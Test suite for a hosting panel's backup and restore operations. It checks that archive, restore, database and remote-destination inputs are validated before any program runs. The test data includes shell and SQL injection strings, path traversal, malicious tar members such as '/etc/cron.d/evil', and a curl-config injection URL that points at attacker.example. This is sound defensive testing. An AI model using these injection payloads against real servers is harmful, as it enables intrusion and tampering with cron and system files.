import { describe, it, expect, vi } from 'vitest';
import { runOp, createContext, OpError, catalog } from '../src/lib.js';
import fs from 'node:fs';
import path from 'node:path';
import { parseTarListing, foldChildren, archiveTop, archiveUser, buildArchiveName, freeArchiveName, tarExcludeArgs, parseCpUserFile, cpmoveMetadata, unsafeMembers, grantDatabase, signS3, s3Target, parseS3Listing, remoteUrl, destinationConfig, createDatabaseStatement, parseCurlVersion, curlPinsHostKey, matchHostKeyLines, resetCurlVersionCache } from '../src/ops/backup.js';

// exec is spied with the real implementation behind it so tests can prove an op
// refused before any program ran. No test here archives, extracts, imports or
// uploads anything: every op either fails its schema or stops at a path/
// capability check.
vi.mock('../src/exec.js', async (importOriginal) => {
  const mod = await importOriginal();
  return { ...mod, exec: vi.fn(mod.exec), hasBinary: vi.fn(mod.hasBinary) };
});
const { exec, hasBinary, resolveBinary } = await import('../src/exec.js');

const ctx = createContext();
const ARCHIVE = '/backup/backup-10.26.2026_02-00-00_alice.tar.gz';

async function opError(promise) {
  try {
    await promise;
  } catch (err) {
    expect(err).toBeInstanceOf(OpError);
    return err;
  }
  throw new Error('expected the op to reject');
}

describe('backup op catalog', () => {
  it('registers the family and flags the destructive ops', () => {
    for (const name of ['backup.account.archive', 'backup.archive.list', 'backup.archive.verify', 'backup.archive.info', 'backup.archive.inspect', 'backup.archive.extract', 'backup.files.restore', 'backup.db.import', 'backup.db.restore_users', 'backup.archive.remove', 'backup.staging.remove', 'backup.destination.test', 'backup.destination.upload', 'backup.destination.download', 'backup.destination.list', 'backup.destination.remove']) expect(catalog.has(name), name).toBe(true);
    for (const name of ['backup.files.restore', 'backup.db.import', 'backup.archive.remove', 'backup.staging.remove', 'backup.destination.remove']) expect(catalog.get(name).destructive, name).toBe(true);
    for (const name of ['backup.account.archive', 'backup.archive.inspect', 'backup.destination.upload', 'backup.destination.test']) expect(catalog.get(name).destructive, name).toBe(false);
  });

  it('rejects unknown ops in the family', async () => {
    expect((await opError(runOp('backup.exec', { cmd: 'tar' }, ctx))).code).toBe('unknown_op');
    expect((await opError(runOp('backup.archive.shell', {}, ctx))).code).toBe('unknown_op');
  });
});

describe('backup schemas reject injection and traversal before anything runs', () => {
  it('backup.account.archive refuses bad usernames, paths, names, databases and zones', async () => {
    exec.mockClear();
    const base = { username: 'alice', homeDir: '/home/alice', dest: '/backup' };
    for (const username of ['-r', 'a;b', '../x', 'Alice', '', 'root user']) expect((await opError(runOp('backup.account.archive', { ...base, username }, ctx))).code, username).toBe('invalid_args');
    for (const homeDir of ['home/alice', '/home/../etc', '/home/alice/..', 'C:\\x', '']) expect((await opError(runOp('backup.account.archive', { ...base, homeDir }, ctx))).code, homeDir).toBe('invalid_args');
    for (const dest of ['backup', '/backup/../root']) expect((await opError(runOp('backup.account.archive', { ...base, dest }, ctx))).code, dest).toBe('invalid_args');
    for (const name of ['alice.tar.gz', 'cpmove-alice.tar.gz', '../x.tar.gz', 'backup-10.26.2026_02-00-00_alice.tar', 'backup-10.26.2026_02-00-00_alice.tar.gz; rm -rf /']) expect((await opError(runOp('backup.account.archive', { ...base, name }, ctx))).code, name).toBe('invalid_args');
    for (const databases of [['alice_shop; DROP DATABASE x'], ['Alice'], ['a'.repeat(65)], ['-x']]) expect((await opError(runOp('backup.account.archive', { ...base, databases }, ctx))).code, JSON.stringify(databases)).toBe('invalid_args');
    for (const excludes of [['../etc'], ['/etc'], ['-rf'], ['a\nb']]) expect((await opError(runOp('backup.account.archive', { ...base, excludes }, ctx))).code, JSON.stringify(excludes)).toBe('invalid_args');
    expect((await opError(runOp('backup.account.archive', { ...base, dnsZones: [{ domain: 'not a domain', body: '' }] }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('backup.account.archive', { ...base, compressionLevel: 11 }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('backup.account.archive', { ...base, credentials: { user: 'root', extra: true } }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('backup.account.archive', { ...base, shell: true }, ctx))).code).toBe('invalid_args');
    expect(exec).not.toHaveBeenCalled();
  });

  it('a name that does not belong to the user, or a destination outside the allowed roots, is refused before tar runs', async () => {
    exec.mockClear();
    expect((await opError(runOp('backup.account.archive', { username: 'alice', homeDir: '/home/alice', dest: '/backup', name: 'backup-10.26.2026_02-00-00_bob.tar.gz' }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('backup.account.archive', { username: 'alice', homeDir: '/home/alice', dest: '/root/backups' }, ctx))).code).toBe('path_not_allowed');
    expect((await opError(runOp('backup.account.archive', { username: 'alice', homeDir: '/etc', dest: '/backup' }, ctx))).code).toBe('path_not_allowed');
    expect(exec).not.toHaveBeenCalled();
  });

  it('archive readers only accept account archive names inside allowed roots', async () => {
    exec.mockClear();
    for (const archive of ['/backup/notes.txt', '/backup/x.tar.gz;id', '/etc/passwd', 'backup-10.26.2026_02-00-00_alice.tar.gz', '/backup/../root/backup-10.26.2026_02-00-00_alice.tar.gz']) {
      for (const op of ['backup.archive.verify', 'backup.archive.info', 'backup.archive.inspect', 'backup.archive.remove']) {
        expect((await opError(runOp(op, { archive }, ctx))).code, `${op} ${archive}`).toBe('invalid_args');
      }
    }
    for (const op of ['backup.archive.verify', 'backup.archive.info', 'backup.archive.inspect', 'backup.archive.remove']) {
      expect((await opError(runOp(op, { archive: '/root/backup-10.26.2026_02-00-00_alice.tar.gz' }, ctx))).code, op).toBe('path_not_allowed');
    }
    expect((await opError(runOp('backup.archive.inspect', { archive: ARCHIVE, prefix: '../meta' }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('backup.archive.inspect', { archive: ARCHIVE, prefix: '-T' }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('backup.archive.verify', { archive: ARCHIVE, sha256: 'not-hex' }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('backup.archive.list', { dir: '/backup', username: 'a;b' }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('backup.archive.list', { dir: '/etc' }, ctx))).code).toBe('path_not_allowed');
    expect(exec).not.toHaveBeenCalled();
  });

  it('backup.files.restore refuses traversal, option-like members and foreign homes', async () => {
    exec.mockClear();
    const base = { archive: ARCHIVE, username: 'alice', homeDir: '/home/alice' };
    for (const paths of [['../etc/passwd'], ['/etc/passwd'], ['-C/'], ['public_html/../../x'], ['a\nb'], ['']]) {
      const err = await opError(runOp('backup.files.restore', { ...base, paths }, ctx));
      expect(err.code, JSON.stringify(paths)).toBe('invalid_args');
      expect(err.details.fields['paths.0']).toBeDefined();
    }
    expect((await opError(runOp('backup.files.restore', { ...base, username: 'root;x' }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('backup.files.restore', { ...base, homeDir: '/etc' }, ctx))).code).toBe('path_not_allowed');
    expect((await opError(runOp('backup.files.restore', { ...base, archive: '/root/backup-10.26.2026_02-00-00_alice.tar.gz' }, ctx))).code).toBe('path_not_allowed');
    expect((await opError(runOp('backup.archive.extract', { archive: ARCHIVE, dest: '/root/x' }, ctx))).code).toBe('path_not_allowed');
    expect((await opError(runOp('backup.staging.remove', { dir: '/backup' }, ctx))).code).toBe('refused');
    expect((await opError(runOp('backup.staging.remove', { dir: '/etc/.restore-1' }, ctx))).code).toBe('path_not_allowed');
    expect(exec).not.toHaveBeenCalled();
  });

  it('backup.files.restore extracts with the account\'s privileges, so it needs setpriv and never runs for uid 0', async () => {
    exec.mockClear();
    hasBinary.mockImplementation((name) => name !== 'setpriv');
    try {
      const err = await opError(runOp('backup.files.restore', { archive: ARCHIVE, username: 'alice', homeDir: '/home/alice' }, ctx));
      expect(err.code).toBe('capability_missing');
      expect(err.message).toMatch(/setpriv/);
    } finally { hasBinary.mockRestore(); }
    // root exists on every host; the op refuses before touching the archive or the home.
    expect((await opError(runOp('backup.files.restore', { archive: '/tmp/whm/backup-10.26.2026_02-00-00_root.tar.gz', username: 'root', homeDir: '/home/root-restore' }, ctx))).code).toBe('refused');
    expect(exec).not.toHaveBeenCalled();
  });

  it('database ops validate identifiers and never run without the client', async () => {
    exec.mockClear();
    for (const file of ['/backup/x.sql; rm', 'relative.sql', '/backup/../etc/x.sql']) expect((await opError(runOp('backup.db.import', { file }, ctx))).code, file).toBe('invalid_args');
    expect((await opError(runOp('backup.db.import', { file: '/backup/x.sql', database: 'Shop;DROP' }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('backup.db.restore_users', { users: [] }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('backup.db.restore_users', { users: [{ user: 'a b', host: 'localhost' }] }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('backup.db.restore_users', { users: [{ user: 'app', host: 'localhost', hashHex: 'zz' }] }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('backup.db.restore_users', { users: [{ user: 'app', host: 'localhost', grants: ['DROP TABLE x'] }] }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('backup.db.import', { file: '/etc/x.sql' }, ctx))).code).toMatch(/capability_missing|path_not_allowed/);
    expect(exec).not.toHaveBeenCalled();
  });

  it('backup.db.restore_users refuses global and system-schema grants and validates allowedDatabases before anything runs', async () => {
    exec.mockClear();
    const user = (grants) => ({ users: [{ user: 'alice_app', host: 'localhost', hashHex: '2A41', grants }] });
    for (const grant of [
      "GRANT ALL PRIVILEGES ON *.* TO 'alice_app'@'localhost'",
      "GRANT USAGE ON *.* TO 'alice_app'@'localhost'",
      "GRANT SELECT ON mysql.* TO 'alice_app'@'localhost'",
      "GRANT SELECT ON `mysql`.`user` TO 'alice_app'@'localhost'",
      "GRANT ALL ON `information_schema`.* TO 'alice_app'@'localhost'",
      "GRANT SELECT ON `performance_schema`.* TO 'alice_app'@'localhost'",
      "GRANT SELECT ON sys.* TO 'alice_app'@'localhost'",
    ]) {
      const err = await opError(runOp('backup.db.restore_users', user([grant]), ctx));
      expect(err.code, grant).toBe('invalid_args');
      expect(err.details.fields['users.0.grants.0'], grant).toBeDefined();
    }
    for (const allowedDatabases of [['alice_shop; DROP'], ['Shop'], ['a'.repeat(65)], 'alice_shop']) expect((await opError(runOp('backup.db.restore_users', { ...user([]), allowedDatabases }, ctx))).code).toBe('invalid_args');
    expect(exec).not.toHaveBeenCalled();
    // A database grant is accepted by the schema; the op then stops at the missing client.
    hasBinary.mockImplementation((name) => !['mysql', 'mariadb'].includes(name));
    try {
      expect((await opError(runOp('backup.db.restore_users', { ...user(["GRANT ALL PRIVILEGES ON `alice_shop`.* TO 'alice_app'@'localhost'"]), allowedDatabases: ['alice_shop'] }, ctx))).code).toBe('capability_missing');
    } finally { hasBinary.mockRestore(); }
    expect(exec).not.toHaveBeenCalled();
    expect(grantDatabase("GRANT ALL PRIVILEGES ON `alice\\_shop`.* TO 'a'@'localhost'")).toBe('alice_shop');
    expect(grantDatabase("GRANT USAGE ON *.* TO 'a'@'localhost'")).toBe('*');
    expect(grantDatabase("GRANT PROXY ON ''@'' TO 'a'@'localhost'")).toBeNull();
  });

  it('creates the schema for a per-database (cPanel) dump from the validated name, taking only charset/collation from <db>.create', () => {
    expect(createDatabaseStatement('alice_shop')).toBe('CREATE DATABASE IF NOT EXISTS `alice_shop`');
    expect(createDatabaseStatement('alice_shop', 'CREATE DATABASE `alice_shop` /*!40100 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci */;\n')).toBe('CREATE DATABASE IF NOT EXISTS `alice_shop` DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci');
    expect(createDatabaseStatement('alice_shop', 'CREATE DATABASE IF NOT EXISTS `other` CHARACTER SET = latin1;')).toBe('CREATE DATABASE IF NOT EXISTS `alice_shop` DEFAULT CHARACTER SET latin1');
    // Nothing but identifier characters ever reaches the statement from the file.
    expect(createDatabaseStatement('alice_shop', "CREATE DATABASE `x` CHARACTER SET utf8; DROP DATABASE mysql; -- COLLATE 'a b'")).toBe('CREATE DATABASE IF NOT EXISTS `alice_shop` DEFAULT CHARACTER SET utf8');
    expect(createDatabaseStatement('alice_shop', 'garbage')).toBe('CREATE DATABASE IF NOT EXISTS `alice_shop`');
    expect(exec).not.toHaveBeenCalled();
  });

  it('import with a database name still stops before any program runs when the client is missing', async () => {
    exec.mockClear();
    hasBinary.mockImplementation((name) => !['mysql', 'mariadb'].includes(name));
    try {
      expect((await opError(runOp('backup.db.import', { file: '/backup/alice_shop.sql', database: 'alice_shop' }, ctx))).code).toBe('capability_missing');
    } finally { hasBinary.mockRestore(); }
    expect(exec).not.toHaveBeenCalled();
  });

  it('destination configs are validated per kind, including hostnames, paths, URLs and bucket names', async () => {
    exec.mockClear();
    const bad = [
      { kind: 'ftp', host: 'h;rm -rf', username: 'u' },
      { kind: 'ftp', host: 'ftp.example.com', username: 'u', path: '../x' },
      { kind: 'ftp', host: 'ftp.example.com', username: 'u', port: 70000 },
      { kind: 'ftp', host: 'ftp.example.com', username: '', password: 'p' },
      { kind: 'sftp', host: 'sftp.example.com', username: 'u', hostKeySha256: 'short' },
      { kind: 'sftp', host: 'sftp.example.com', username: 'u', path: 'a b', insecure: true },
      { kind: 'sftp', host: 'sftp.example.com', username: 'u', password: 'p' },
      { kind: 'webdav', url: 'file:///etc/passwd' },
      { kind: 'webdav', url: 'not a url' },
      { kind: 's3', bucket: 'Bad_Bucket', accessKey: 'a', secretKey: 'b' },
      { kind: 's3', bucket: 'ok-bucket', accessKey: 'a', secretKey: 'b', region: 'EU West' },
      { kind: 's3', bucket: 'ok-bucket', accessKey: 'a', secretKey: 'b', endpoint: 'gopher://x' },
      { kind: 'local', dir: 'relative' },
      { kind: 'gdrive', folder: 'x' },
      { kind: 'local', dir: '/backup', extra: 1 },
    ];
    for (const config of bad) {
      for (const [op, extra] of [['backup.destination.test', {}], ['backup.destination.upload', { file: ARCHIVE }], ['backup.destination.remove', { remoteName: 'cpmove-alice.tar.gz' }], ['backup.destination.list', {}]]) {
        expect((await opError(runOp(op, { config, ...extra }, ctx))).code, `${op} ${JSON.stringify(config)}`).toBe('invalid_args');
      }
    }
    const good = { kind: 'ftp', host: 'ftp.example.com', username: 'u', password: 'p' };
    expect((await opError(runOp('backup.destination.upload', { config: good, file: '/backup/notes.txt' }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('backup.destination.upload', { config: good, file: ARCHIVE, remoteName: '../x.tar.gz' }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('backup.destination.remove', { config: good, remoteName: 'x; rm' }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('backup.destination.download', { config: good, remoteName: 'cpmove-alice.tar.gz', dest: '/etc' }, ctx))).code).toBe('path_not_allowed');
    expect((await opError(runOp('backup.destination.upload', { config: good, file: '/root/backup-10.26.2026_02-00-00_alice.tar.gz' }, ctx))).code).toBe('path_not_allowed');
    expect((await opError(runOp('backup.destination.test', { config: { kind: 'local', dir: '/etc/backups' } }, ctx))).code).toBe('path_not_allowed');
    expect(exec).not.toHaveBeenCalled();
    // SFTP verifies the server only with a pinned fingerprint or an explicit opt-out.
    const sftp = { kind: 'sftp', host: '10.0.0.5', username: 'u', path: '~/backups' };
    const unpinned = destinationConfig.safeParse(sftp);
    expect(unpinned.success).toBe(false);
    expect(unpinned.error.issues[0].path).toEqual(['hostKeySha256']);
    expect(destinationConfig.safeParse({ ...sftp, hostKeySha256: 'A'.repeat(43) }).success).toBe(true);
    expect(destinationConfig.safeParse({ ...sftp, insecure: true }).success).toBe(true);
    expect(destinationConfig.safeParse({ kind: 'ftp', host: '10.0.0.5', username: 'u' }).success).toBe(true);
  });
});

describe('pure helpers', () => {
  it('takes the next free second when an archive name is taken, and anchors exclude patterns at the home root', () => {
    const at = new Date(2026, 9, 26, 2, 5, 9);
    expect(freeArchiveName('alice', () => false, at)).toBe('backup-10.26.2026_02-05-09_alice.tar.gz');
    const taken = new Set(['backup-10.26.2026_02-05-09_alice.tar.gz', 'backup-10.26.2026_02-05-10_alice.tar.gz']);
    expect(freeArchiveName('alice', (n) => taken.has(n), at)).toBe('backup-10.26.2026_02-05-11_alice.tar.gz');
    expect(() => freeArchiveName('alice', () => true, at)).toThrow(OpError);
    expect(tarExcludeArgs('alice', ['tmp', 'logs/', '.cache'], false)).toEqual(['--anchored', '--no-wildcards-match-slash', '--exclude=alice/mail', '--exclude=alice/tmp', '--exclude=alice/logs', '--exclude=alice/.cache']);
    expect(tarExcludeArgs('alice', [], true)).toEqual(['--anchored', '--no-wildcards-match-slash']);
  });

  it('reads cPanel cp/<user>, pds, addons and sds2 into the panel metadata shape', () => {
    expect(parseCpUserFile('DNS=Alice.com\nPLAN=gold\n# comment\nlower=x\nOWNER=resell1 \n')).toEqual({ DNS: 'Alice.com', PLAN: 'gold', OWNER: 'resell1' });
    const meta = cpmoveMetadata('DNS=alice.com\nDNS1=blog.alice.com\nPLAN=gold\nOWNER=resell1\nCONTACTEMAIL=a@example.com\nIP=10.0.0.5\n', 'alice', {
      pds: 'park.com\n',
      addons: 'addon.com=addon_alice.com\n',
      sds2: 'addon.alice.com=/home/alice/public_html/addon\nblog.alice.com=/home/alice/public_html/blog\n',
    });
    expect(meta.source).toBe('cpmove');
    expect(meta.account).toEqual({ username: 'alice', domain: 'alice.com', package_name: 'gold', owner: 'resell1', contact_email: 'a@example.com', ip: '10.0.0.5', plan: {} });
    expect(meta.domains).toEqual([
      { domain: 'addon.com', type: 'addon', docroot: '/home/alice/public_html/addon' },
      { domain: 'blog.alice.com', type: 'sub', docroot: '/home/alice/public_html/blog' },
      { domain: 'park.com', type: 'parked', docroot: null },
    ]);
    expect(cpmoveMetadata('PLAN=gold\n', 'alice')).toBeNull();
    expect(cpmoveMetadata('DNS=not a domain\n', 'alice')).toBeNull();
    expect(cpmoveMetadata('DNS=alice.com\n', 'alice', { addons: 'bad domain=x\n', pds: '../etc\n' }).domains).toEqual([]);
  });

  it('names the archive members a restore refuses: device nodes, absolute names and ".." segments', () => {
    const entries = parseTarListing([
      '-rw-r--r-- alice/alice 10 2026-10-26 02:00 cpmove-alice/homedir/public_html/index.html',
      'drwxr-xr-x alice/alice 0 2026-10-26 02:00 cpmove-alice/homedir/public_html/',
      'crw-rw-rw- root/root 1,3 2026-10-26 02:00 cpmove-alice/homedir/dev/null',
      'brw-rw---- root/root 0 2026-10-26 02:00 cpmove-alice/homedir/sda',
      '-rw-r--r-- root/root 10 2026-10-26 02:00 /etc/cron.d/evil',
      '-rw-r--r-- root/root 10 2026-10-26 02:00 cpmove-alice/homedir/../../root/.bashrc',
      'lrwxrwxrwx alice/alice 0 2026-10-26 02:00 cpmove-alice/homedir/link -> /etc',
    ].join('\n'));
    expect(unsafeMembers(entries)).toEqual([
      { name: 'cpmove-alice/homedir/dev/null', reason: 'device node' },
      { name: 'cpmove-alice/homedir/sda', reason: 'device node' },
      { name: '/etc/cron.d/evil', reason: 'absolute path' },
      { name: 'cpmove-alice/homedir/../../root/.bashrc', reason: '".." segment' },
    ]);
  });

  it('derives names, top directories and users of archives', () => {
    expect(buildArchiveName('alice', new Date(2026, 9, 26, 2, 5, 9))).toBe('backup-10.26.2026_02-05-09_alice.tar.gz');
    expect(archiveTop('/backup/backup-10.26.2026_02-05-09_alice.tar.gz')).toBe('backup-10.26.2026_02-05-09_alice');
    expect(archiveTop('/x/cpmove-alice.tar')).toBe('cpmove-alice');
    expect(archiveUser('backup-10.26.2026_02-05-09_alice.tar.gz')).toBe('alice');
    expect(archiveUser('cpmove-bob.tar.gz')).toBe('bob');
    expect(archiveUser('carol.tar')).toBe('carol');
    expect(archiveUser('notes.txt')).toBeNull();
  });

  it('parses tar -tv output and folds it into direct children', () => {
    const listing = [
      'drwxr-xr-x alice/alice       0 2026-10-26 02:00 top/homedir/',
      'drwxr-xr-x alice/alice       0 2026-10-26 02:00 top/homedir/public_html/',
      '-rw-r--r-- alice/alice     120 2026-10-26 01:59 top/homedir/public_html/index.html',
      '-rw-r--r-- alice/alice      30 2026-10-26 01:58 top/homedir/public_html/with space.txt',
      'lrwxrwxrwx alice/alice       0 2026-10-26 01:50 top/homedir/www -> public_html',
      '-rw------- alice/alice     220 2026-10-26 01:40 top/homedir/.bashrc',
      'garbage line',
    ].join('\n');
    const entries = parseTarListing(listing).map((e) => ({ ...e, name: e.name.slice(4) }));
    expect(entries).toHaveLength(6);
    expect(entries.find((e) => e.name === 'homedir/www')).toMatchObject({ type: 'link', target: 'public_html' });
    expect(entries.find((e) => e.name === 'homedir/public_html/with space.txt')).toMatchObject({ type: 'file', size: 30 });
    const children = foldChildren(entries, 'homedir');
    expect(children.map((c) => c.name)).toEqual(['public_html', '.bashrc', 'www']);
    expect(children[0]).toMatchObject({ type: 'dir', size: 150, files: 2, owner: 'alice:alice' });
    expect(children[1]).toMatchObject({ type: 'file', size: 220, files: 1 });
  });

  it('signs S3 requests deterministically (SigV4) and resolves virtual-hosted / path-style targets', () => {
    const headers = signS3({ method: 'PUT', host: 'bkt.s3.eu-west-1.amazonaws.com', path: '/panel/backup.tar.gz', headers: { 'Content-Type': 'application/gzip', 'content-length': '10' }, payloadHash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', region: 'eu-west-1', accessKey: 'AKIDEXAMPLE', secretKey: 'wJalrXUtnFEMI/K7MDENG+bPxRfiCYEXAMPLEKEY', date: new Date('2026-10-26T02:00:00Z') });
    expect(headers['x-amz-date']).toBe('20261026T020000Z');
    expect(headers.authorization).toMatch(/^AWS4-HMAC-SHA256 Credential=AKIDEXAMPLE\/20261026\/eu-west-1\/s3\/aws4_request, SignedHeaders=content-length;content-type;host;x-amz-content-sha256;x-amz-date, Signature=[a-f0-9]{64}$/);
    const again = signS3({ method: 'PUT', host: 'bkt.s3.eu-west-1.amazonaws.com', path: '/panel/backup.tar.gz', headers: { 'content-type': 'application/gzip', 'content-length': '10' }, payloadHash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', region: 'eu-west-1', accessKey: 'AKIDEXAMPLE', secretKey: 'wJalrXUtnFEMI/K7MDENG+bPxRfiCYEXAMPLEKEY', date: new Date('2026-10-26T02:00:00Z') });
    expect(again.authorization).toBe(headers.authorization);
    expect(s3Target({ bucket: 'bkt', region: 'eu-west-1', pathStyle: false }, 'panel/a b.tar.gz')).toMatchObject({ host: 'bkt.s3.eu-west-1.amazonaws.com', path: '/panel/a%20b.tar.gz', protocol: 'https:' });
    expect(s3Target({ bucket: 'bkt', region: 'us-east-1', endpoint: 'http://minio.local:9000', pathStyle: true }, 'x.tar.gz')).toMatchObject({ host: 'minio.local:9000', hostname: 'minio.local', port: 9000, path: '/bkt/x.tar.gz', protocol: 'http:' });
    expect(s3Target({ bucket: 'bkt', region: 'us-west-004', endpoint: 'https://s3.us-west-004.backblazeb2.com', pathStyle: false }, '')).toMatchObject({ host: 'bkt.s3.us-west-004.backblazeb2.com', path: '/' });
    expect(parseS3Listing('<ListBucketResult><Contents><Key>panel/backup-10.26.2026_02-00-00_alice.tar.gz</Key><LastModified>2026-10-26T02:01:00.000Z</LastModified><Size>4096</Size></Contents><Contents><Key>panel/</Key><Size>0</Size></Contents></ListBucketResult>')).toEqual([
      { key: 'panel/backup-10.26.2026_02-00-00_alice.tar.gz', sizeBytes: 4096, mtime: '2026-10-26T02:01:00.000Z' }, { key: 'panel/', sizeBytes: 0, mtime: null },
    ]);
  });

  it('builds curl URLs with encoded path segments and the FTP/SFTP absolute-path conventions', () => {
    expect(remoteUrl({ kind: 'ftp', host: 'ftp.example.com', port: 21, path: 'backups/whm' }, 'a.tar.gz')).toBe('ftp://ftp.example.com:21/backups/whm/a.tar.gz');
    expect(remoteUrl({ kind: 'ftp', host: 'ftp.example.com', port: 2121, path: '/srv/abs' }, 'a.tar.gz')).toBe('ftp://ftp.example.com:2121//srv/abs/a.tar.gz');
    expect(remoteUrl({ kind: 'sftp', host: '10.0.0.5', port: 22, path: '/srv/backups' }, 'a.tar.gz')).toBe('sftp://10.0.0.5:22/srv/backups/a.tar.gz');
    expect(remoteUrl({ kind: 'sftp', host: 'h.example.com', port: 22, path: '~/backups' }, '')).toBe('sftp://h.example.com:22/~/backups/');
    expect(remoteUrl({ kind: 'webdav', url: 'https://dav.example.com/remote.php/dav/files/u/' }, 'a.tar.gz')).toBe('https://dav.example.com/remote.php/dav/files/u/a.tar.gz');
  });
});

// GitHub's published ed25519 host key and its SHA-256 fingerprint (docs.github.com).
const ED25519_KEY = 'AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl';
const ED25519_FP = '+DiY3wvvV6TuJJhbpZisF/zLDA0zPMSvHdkr4UvCOqU';

describe('destination URLs are single-line literals in the curl config', () => {
  it('rejects URLs with newlines, quotes, backslashes or control characters for webdav and s3 endpoints', async () => {
    exec.mockClear();
    const bad = ['https://dav.example.com/b\noutput = /etc/cron.d/whm\nurl = https://attacker.example/cron', 'https://dav.example.com/b\toutput=/x', 'https://dav.example.com/b"\nurl = "file:///etc/hostname', 'https://dav.example.com/a\\b', "https://dav.example.com/it's", 'https://dav.example.com/x\x01y', 'https://dav.example.com/x y'];
    for (const url of bad) {
      expect(destinationConfig.safeParse({ kind: 'webdav', url }).success, JSON.stringify(url)).toBe(false);
      expect(destinationConfig.safeParse({ kind: 's3', bucket: 'ok-bucket', accessKey: 'a', secretKey: 'b', endpoint: url }).success, JSON.stringify(url)).toBe(false);
      expect((await opError(runOp('backup.destination.test', { config: { kind: 'webdav', url } }, ctx))).code, JSON.stringify(url)).toBe('invalid_args');
    }
    expect(exec).not.toHaveBeenCalled();
    expect(destinationConfig.safeParse({ kind: 'webdav', url: 'https://dav.example.com/remote.php/dav/files/u/?x=1&y=%20' }).success).toBe(true);
    expect(destinationConfig.safeParse({ kind: 's3', bucket: 'ok-bucket', accessKey: 'a', secretKey: 'b', endpoint: 'http://minio.local:9000' }).success).toBe(true);
  });
});

describe('backup.archive.extract screens untrusted archives before tar runs as root', () => {
  fs.mkdirSync('/tmp/whm', { recursive: true, mode: 0o700 });
  const dir = fs.mkdtempSync('/tmp/whm/test-extract-');
  const archive = path.join(dir, 'backup-10.26.2026_02-00-00_alice.tar.gz');
  fs.writeFileSync(archive, '');
  const dest = path.join(dir, '.restore-1');
  const tarCalls = () => exec.mock.calls.filter(([bin]) => bin === 'tar');

  it('refuses device nodes, absolute names and ".." members in the control parts without extracting', async () => {
    exec.mockClear();
    exec.mockImplementation(async (bin, argv) => {
      if (bin === 'tar' && argv[0] === '--list') return { code: 0, stdout: ['drwx------ root/root 0 2026-10-26 02:00 backup-10.26.2026_02-00-00_alice/meta/', 'crw-rw-rw- root/root 1,3 2026-10-26 02:00 backup-10.26.2026_02-00-00_alice/meta/dev', '-rwsr-xr-x root/root 10 2026-10-26 02:00 backup-10.26.2026_02-00-00_alice/mysql/x'].join('\n'), stderr: '', bin, argv };
      throw new Error(`unexpected program ${bin} ${argv.join(' ')}`);
    });
    try {
      const err = await opError(runOp('backup.archive.extract', { archive, dest }, ctx));
      expect(err.code).toBe('invalid_archive');
      expect(err.message).toMatch(/meta\/dev \(device node\)/);
      expect(tarCalls()).toHaveLength(1);
      expect(tarCalls()[0][1].slice(0, 3)).toEqual(['--list', '--verbose', '--absolute-names']);
      expect(fs.existsSync(dest)).toBe(false);
    } finally { exec.mockRestore(); }
  });

  it('extracts a clean archive with --no-same-permissions so archived setuid bits are not recreated', async () => {
    exec.mockClear();
    exec.mockImplementation(async (bin, argv) => {
      if (bin === 'tar' && argv[0] === '--list') return { code: 0, stdout: 'drwx------ root/root 0 2026-10-26 02:00 backup-10.26.2026_02-00-00_alice/meta/\n-rw------- root/root 2 2026-10-26 02:00 backup-10.26.2026_02-00-00_alice/meta/info.json\n', stderr: '', bin, argv };
      if (bin === 'tar' && argv[0] === '--extract') return { code: 0, stdout: '', stderr: '', bin, argv };
      throw new Error(`unexpected program ${bin} ${argv.join(' ')}`);
    });
    try {
      const out = await runOp('backup.archive.extract', { archive, dest }, ctx);
      expect(out.stagingDir).toBe(dest);
      const extract = tarCalls().find(([, argv]) => argv[0] === '--extract')[1];
      expect(extract).toContain('--no-same-permissions');
      expect(extract).toContain('--no-same-owner');
      expect(extract).not.toContain('--preserve-permissions');
    } finally { exec.mockRestore(); fs.rmSync(dir, { recursive: true, force: true }); }
  });
});

describe('SFTP host key pinning on curl without --hostpubsha256', () => {
  const sftp = { kind: 'sftp', host: 'sftp.example.com', port: 2222, username: 'u', password: 'p', hostKeySha256: ED25519_FP };
  const keyscan = `# sftp.example.com:2222 SSH-2.0-OpenSSH_8.7\n[sftp.example.com]:2222 ssh-ed25519 ${ED25519_KEY}\n[sftp.example.com]:2222 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0\n`;

  function mockHost({ version, keyscanAvailable = true }) {
    const curlCalls = [];
    hasBinary.mockImplementation((name) => (name === 'curl' ? true : name === 'ssh-keyscan' ? keyscanAvailable : Boolean(resolveBinary(name))));
    exec.mockImplementation(async (bin, argv, opts = {}) => {
      if (bin === 'curl' && argv[0] === '--version') return { code: 0, stdout: `curl ${version} (x86_64-redhat-linux-gnu) libcurl/${version} OpenSSL/3.0.7 libssh/0.10.4/openssl/zlib\n`, stderr: '', bin, argv };
      if (bin === 'ssh-keyscan') return { code: 0, stdout: keyscan, stderr: '# sftp.example.com:2222 SSH-2.0-OpenSSH_8.7\n', bin, argv };
      if (bin === 'curl' && argv[0] === '-K') {
        const home = opts.env?.HOME ?? null;
        let knownHosts = null;
        try { knownHosts = fs.readFileSync(path.join(home, '.ssh', 'known_hosts'), 'utf8'); } catch { /* no private HOME */ }
        curlCalls.push({ cnf: fs.readFileSync(argv[1], 'utf8'), home, knownHosts });
